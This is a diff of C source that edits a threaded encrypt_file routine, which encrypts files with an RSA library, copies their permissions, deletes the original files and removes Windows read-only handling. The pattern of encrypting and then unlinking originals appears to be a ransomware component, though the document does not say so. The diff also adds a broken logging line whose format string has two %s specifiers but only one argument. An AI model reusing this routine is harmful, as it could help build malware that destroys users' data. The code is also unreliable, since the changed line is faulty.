@@ -5,10 +5,6 @@
 #include <sys/stat.h>
 #include <unistd.h>
 
-#ifdef _WIN64
-#include <windows.h>
-#endif
-
 #include "../lib/log.h"
 #include "../lib/rsa.h"
 #include "../lib/util.h"
@@ -102,20 +98,6 @@ void encrypt_file(void *arg) {
       break;
   }
 
-#ifdef _WIN64
-  fclose(in);
-  fclose(out);
-
-  out = NULL;
-  in  = NULL;
-
-  if (!copy_stat(in_file, out_file)) {
-    debug("(%s) Failed to copy perms", in_file);
-    goto FREE;
-  }
-
-  SetFileAttributes(in_file, GetFileAttributes(in_file) & ~FILE_ATTRIBUTE_READONLY);
-#else
   struct stat st;
   fstat(fileno(in), &st);
 
@@ -123,10 +105,9 @@ void encrypt_file(void *arg) {
     debug("(%s) Failed to copy perms", in_file);
     goto FREE;
   }
-#endif
 
   if (unlink(in_file) < 0) {
-    debug("(%s) Failed to unlink file", in_file);
+    debug("(%s) Failed to unlink: %s", in_file);
     goto FREE;
   }
 
@@ -144,9 +125,6 @@ FREE:
 
   if (!success) {
     error("Failed to encrypt file: %s", in_file);
-#ifdef _WIN64
-    SetFileAttributes(out_file, GetFileAttributes(out_file) & ~FILE_ATTRIBUTE_READONLY);
-#endif
     unlink(out_file);
   }
 
